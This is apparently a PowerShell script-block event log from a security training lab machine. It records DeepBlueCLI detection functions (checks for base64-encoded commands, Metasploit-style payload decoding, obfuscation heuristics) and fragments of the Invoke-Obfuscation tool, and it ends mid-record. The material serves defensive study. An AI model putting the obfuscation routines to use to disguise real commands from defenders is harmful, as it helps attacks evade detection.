{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:25:40.275497Z"},"EventRecordID":611634,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-902E-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Create-Filter($file, $logname)\r\n{\r\n    # Return the Get-Winevent filter \r\n    #\r\n    $sys_events=\"7030,7036,7045\"\r\n    $sec_events=\"4688,4720,4728,4732,4625\"\r\n    $app_events=\"2\"\r\n    $applocker_events=\"8003,8004,8006,8007\"\r\n    $powershell_events=\"4103,4104\"\r\n    $sysmon_events=\"1,7\"\r\n    if ($file -ne \"\"){\r\n        switch ($logname){\r\n            \"Security\"    {$filter=\"@{path=\"\"$file\"\";ID=$sec_events}\"}\r\n            \"System\"      {$filter=\"@{path=\"\"$file\"\";ID=$sys_events}\"}\r\n            \"Application\" {$filter=\"@{path=\"\"$file\"\";ID=$app_events}\"}\r\n            \"Applocker\"   {$filter=\"@{path=\"\"$file\"\";ID=$applocker_events}\"}\r\n            \"Powershell\"  {$filter=\"@{path=\"\"$file\"\";ID=$powershell_events}\"}\r\n            \"Sysmon\"      {$filter=\"@{path=\"\"$file\"\";ID=$sysmon_events}\"}\r\n            default       {\"Logic error 1, should not reach here...\";Exit 1}\r\n        }\r\n    }\r\n    else{\r\n        switch ($logname){\r\n            \"Security\"    {$filter=\"@{Logname=\"\"Security\"\";ID=$sec_events}\"}\r\n            \"System\"      {$filter=\"@{Logname=\"\"System\"\";ID=$sys_events}\"}\r\n            \"Application\" {$filter=\"@{Logname=\"\"Application\"\";ID=$app_events}\"}\r\n            \"Applocker\"   {$filter=\"@{logname=\"\"Microsoft-Windows-AppLocker\"\";ID=$applocker_events}\"}\r\n            \"Powershell\"  {$filter=\"@{logname=\"\"Microsoft-Windows-PowerShell/Operational\"\";ID=$powershell_events}\"}\r\n            \"Sysmon\"      {$filter=\"@{logname=\"\"Microsoft-Windows-Sysmon/Operational\"\";ID=$sysmon_events}\"}\r\n            default       {\"Logic error 2, should not reach here...\";Exit 1}\r\n        }\r\n    }\r\n    return $filter\r\n}","ScriptBlockId":"e7b8425e-604a-4733-bb6b-4c4b42c5f757","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.3.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:27:04.659009Z"},"EventRecordID":611637,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-A22E-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Check-Command($commandline,$minlength,$regexes,$whitelist,$servicecmd){\r\n    $text=\"\"\r\n    $base64=\"\"\r\n    # Check to see if command is whitelisted\r\n    foreach ($entry in $whitelist) {\r\n        if ($commandline -Match $entry.regex) {\r\n            # Command is whitelisted, return nothing\r\n            return\r\n        }\r\n    }\r\n    #$cmdlength=$commandline.length\r\n    #if ($cmdlength -gt $minlength){\r\n    if ($commandline.length -gt $minlength){\r\n        $text += \"   - Long Command Line: greater than $minlength bytes`n\"\r\n    }\r\n    $text += (Check-Obfu $commandline)\r\n    $text += (Check-Regex $commandline $regexes 0)\r\n    # Check for base64 encoded function, decode and print if found\r\n    # This section is highly use case specific, other methods of base64 encoding and/or compressing may evade these checks\r\n    if ($commandline -Match \"\\-enc.*[A-Za-z0-9/+=]{100}\"){\r\n        $base64= $commandline -Replace \"^.* \\-Enc(odedCommand)? \",\"\"\r\n    }\r\n    ElseIf ($commandline -Match \":FromBase64String\\(\"){\r\n        $base64 = $commandline -Replace \"^.*:FromBase64String\\(\\'*\",\"\"\r\n        $base64 = $base64 -Replace \"\\'.*$\",\"\"\r\n    }\r\n    if ($base64){\r\n        if ($commandline -Match \"Compression.GzipStream.*Decompress\"){\r\n            # Metasploit-style compressed and base64-encoded function. Uncompress it.\r\n            $decoded=New-Object IO.MemoryStream(,[Convert]::FromBase64String($base64))\r\n            $uncompressed=(New-Object IO.StreamReader(((New-Object IO.Compression.GzipStream($decoded,[IO.Compression.CompressionMode]::Decompress))),[Text.Encoding]::ASCII)).ReadToEnd()\r\n            $text += \"  Decoded/decompressed Base64:\" + $uncompressed \r\n            $text += \"   - Base64-encoded and compressed function`n\"\r\n        }\r\n        else{\r\n            $decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($base64))\r\n            $text += \"  Decoded Base64:\" + $decoded + \"`n\"\r\n            $text += \"   - Base64-encoded function`n\"\r\n            $text += (Check-Obfu $decoded)\r\n            $text += (Check-Regex $decoded $regexes 0)\r\n            #foreach ($regex in $regexes){\r\n            #    if ($regex.Type -eq 0) { # Image Path match\r\n            #        if ($decoded -Match $regex.regex) {\r\n            #            $text += \"   - \" + $regex.String + \"`n\"\r\n            #        }\r\n            #    }\r\n            #}\r\n        }\r\n    }\r\n    if ($text){\r\n        if ($servicecmd){\r\n            return \"  Service File Name: $commandline`n\" + $text\r\n        }\r\n        Else{\r\n            return \"  Command Line: $commandline`n\" + $text\r\n        }\r\n    }\r\n    return \"\"\r\n}","ScriptBlockId":"69b59d96-d0c7-48e8-9cb1-b6658064e233","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.3.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:27:04.660102Z"},"EventRecordID":611638,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-A32E-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Check-Obfu($string){\r\n    # Check how many special characters are in the command. Inspired by Invoke-Obfuscation: https://twitter.com/danielhbohannon/status/778268820242825216\r\n    # There are many ways to do this, including regex. Need a way that doesn't kill the CPU. This works, but isn't super concise. There is probably a\r\n    # better way.\r\n    # \r\n    $obfutext=\"\" # Local variable for return output\r\n    $maxchars=25\r\n    #$obfuchars = \"\\+\", \"\\'\", \"\\}\", \"\\{\"\r\n    #foreach ($char in $obfuchars){\r\n    #\r\n    # I tried to loop through the characters (as the two commented lines above show, but\r\n    # hit problems of variable interpolation. I am probably making a simple mistake.\r\n    # If you can get the above loop working, please email deepblue at backshore dot net. \r\n    # I will repay in an adult beverage \r\n    #\r\n    # In the meantime, this is ugly, but works\r\n    $string2 = $string -replace \"`'\"\r\n    # Compare the length\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars ' characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`{\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars { characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`}\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars } characters`n\"\r\n    }\r\n    $string2 = $string -replace \",\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars , characters`n\"\r\n    }\r\n    $string2 = $string -replace \"!\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars ! characters`n\"\r\n    }\r\n    $string2 = $string -replace \"%\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars & characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`\"\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars double quotes`n\"\r\n    }\r\n    return $obfutext\r\n    #}\r\n}","ScriptBlockId":"0b15b214-07c1-4716-803f-d572d68f8fbf","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.3.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:27:04.661001Z"},"EventRecordID":611639,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-C222-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"function Check-Regex($string,$regexes,$type){\r\n    $regextext=\"\" # Local variable for return output\r\n    foreach ($regex in $regexes){\r\n        if ($regex.Type -eq $type) { # Type is 0 for Commands, 1 for services. Set in regexes.csv\r\n            if ($string -Match $regex.regex) {\r\n               $regextext += \"   - \" + $regex.String + \"`n\"\r\n            }\r\n        }\r\n    }\r\n    return $regextext\r\n}","ScriptBlockId":"22ad80bc-9b18-4a2c-9db3-ce7301c1b247","Path":"C:\\Users\\student\\Desktop\\DeepBlueCLI-master\\DeepBlue-0.3.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:27:09.364524Z"},"EventRecordID":611659,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-4A23-72CFA721D301"},"Execution_attributes":{"ProcessID":4196,"ThreadID":5528},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"prompt","ScriptBlockId":"a189cc3a-c458-4095-906b-2840d7ad4364","Path":""}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:52.559688Z"},"EventRecordID":611665,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-0B30-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$UpperLowerChar = $_; If(((Get-Random -Input @(1..2))-1 -eq 0)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $RandomDelimiters += $UpperLowerChar}","ScriptBlockId":"1d5e9179-bca5-47dc-96da-0c21bf8f5f6c","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:52.574485Z"},"EventRecordID":611694,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-2024-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$DelimitedEncodedArray += ([Convert]::ToString(([Int][Char]$_),$EncodingBase) + (Get-Random -Input $RandomDelimiters))}","ScriptBlockId":"d5daf8be-81c2-408d-8baa-613a88b4d213","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.960781Z"},"EventRecordID":614668,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-C42A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"c74ca81e-6412-4e29-a40a-cc5b844d06eb","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.968790Z"},"EventRecordID":614684,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-C62A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"897a0a7a-c8ee-4fa4-b65c-f73011c7b577","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.973000Z"},"EventRecordID":614694,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-CF2A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"17789e57-b65e-4af3-ae74-21ef0034c7a3","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.976025Z"},"EventRecordID":614701,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-3235-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"c66d2090-146a-42c8-98b6-44ac780a3d9e","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.978874Z"},"EventRecordID":614707,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-3535-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"52ae55b3-edbe-4e4a-9351-c7b334232e5c","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.981734Z"},"EventRecordID":614712,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D52A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"14f2c0a9-92ea-4daa-89b2-8f769d1b72b4","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:53.991050Z"},"EventRecordID":614728,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-D62A-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"c636d334-3d97-4afc-a181-a6ee93559136","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:54.000810Z"},"EventRecordID":614749,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-4735-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"74cd4a03-8c79-45ba-b730-d41b6618c580","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:54.036216Z"},"EventRecordID":614831,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-372B-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"688f4187-26c1-44d0-937b-8ff8c0771a85","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:54.050249Z"},"EventRecordID":614861,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-6435-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{\r\n        # Encapsulate current item with single quote if it contains a non-integer.\r\n        If([Convert]::ToString(([Int][Char]$_),$EncodingBase).Trim('0123456789').Length -gt 0) {$Quote = \"'\"}\r\n        Else {$Quote = ''}\r\n        $EncodedArray += ($Quote + [Convert]::ToString(([Int][Char]$_),$EncodingBase) + $Quote + ' '*(Get-Random -Input @(0,1)) + ',' + ' '*(Get-Random -Input @(0,1)))\r\n    }","ScriptBlockId":"08ffbf88-db75-427f-a643-f4e8916264ef","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:56.644478Z"},"EventRecordID":620817,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-5E41-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"d21840f1-14f4-4608-8d8f-6455419a2aed","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:56.651519Z"},"EventRecordID":620830,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-6A41-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"5437d51f-2dff-4394-97f3-23e0e799b230","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:55:56.696013Z"},"EventRecordID":620920,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0001-AF36-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":"{$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}","ScriptBlockId":"4e8948c2-e29c-4880-96e3-b40c293d2890","Path":"C:\\Users\\student\\Desktop\\Invoke-Obfuscation-master\\Out-EncodedBinaryCommand.ps1"}}}
{"Event_attributes":{"xmlns":"http://schemas.microsoft.com/win/2004/08/events/event"},"Event":{"System":{"Provider_attributes":{"Name":"Microsoft-Windows-PowerShell","Guid":"A0C1853B-5C40-4B15-8766-3CF1C58F985A"},"EventID":4104,"Version":1,"Level":5,"Task":2,"Opcode":15,"Keywords":"0x0","TimeCreated_attributes":{"SystemTime":"2017-08-30T18:56:09.115466Z"},"EventRecordID":622103,"Correlation_attributes":{"ActivityID":"CF705CDF-21A7-0000-E543-72CFA721D301"},"Execution_attributes":{"ProcessID":5092,"ThreadID":4352},"Channel":"Microsoft-Windows-PowerShell/Operational","Computer":"SEC511","Security_attributes":{"UserID":"S-1-5-21-1552841522-3835366585-4197357653-1001"}},"EventData":{"MessageNumber":1,"MessageTotal":1,"ScriptBlockText":" 